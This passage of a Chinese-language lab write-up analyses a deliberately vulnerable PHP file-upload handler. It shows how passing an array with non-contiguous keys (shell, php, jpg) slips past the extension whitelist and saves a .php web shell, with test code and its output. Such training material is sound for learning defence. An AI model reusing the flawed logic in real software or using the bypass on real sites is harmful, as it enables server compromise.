            if (!is_array($file)) {
                $file = explode('.', strtolower($file));
            }

            $ext = end($file);
            $allow_suffix = array('jpg','png','gif');
            if (!in_array($ext, $allow_suffix)) {
                $msg = "禁止上传该后缀文件!";
            }else{
                $file_name = reset($file) . '.' . $file[count($file) - 1];
                $temp_file = $_FILES['upload_file']['tmp_name'];
                $img_path = UPLOAD_PATH . '/' .$file_name;
                if (move_uploaded_file($temp_file, $img_path)) {
                    $msg = "文件上传成功！";
                    $is_upload = true;
                } else {
                    $msg = "文件上传失败！";
                }
            }
        }
    }else{
        $msg = "请选择要上传的文件！";
    }

先检查MIME，通过后检查文件名，保存名称为空的就用上传的文件名。再判断文件名是否是array数组，不是的话就用explode()函数通过.号分割成数组。然后获取最后一个，也就是后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。


    explode(string $delimiter , string $string [, int $limit])//返回由字符串组成的数组，每个元素都是string的一个子串，它们被字符串delimiter作为边界点分割出来 
    reset(array &$array)//将数组的内部指针指向第一个单元
    end() 把数组内部指针移动到数组最后一个元素，并返回值。
    count()函数数组元素的数量。

通过$file_name = reset($file) . '.' . $file[count($file) - 1];可以知道最终的文件名是由数组的第一个和最后一个元素拼接而成。如果是正常思维来讲，无论如何都是没有办法绕过的，但是有个地方给了一个提示。

    if (!is_array($file)) {
        $file = explode('.', strtolower($file));
    }

这里有个判断，如果不是数组，就自己拆成数组，也就是说，我们是可以自己传数组进入的。

如果第一个元素是reset()，最后一个元素是end()，讲道理 $file[count($file)-1] 也就是最后一个，但是为什么不直接使用end()呢

也就是说有特殊的情况下，这两个东西是不等的，其实就是这样的一个数组

$array=([0]->'shell' [2]->'php' [3]->'jpg')

测试代码

    <?php
    $file = array();
    $file[0] = 'shell';
    $file[2] = 'php';
    $file[3] = 'jpg';
    print_r($file);
    echo "数组总元素个数为".count($file);
    ?>


运行结果

    Array
    (
        [0] => shell
        [2] => php
        [3] => jpg
    )
    数组总元素个数为3

绕过姿势：

![](https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/Screenshot%20from%202021-05-21%2001-56-52.png)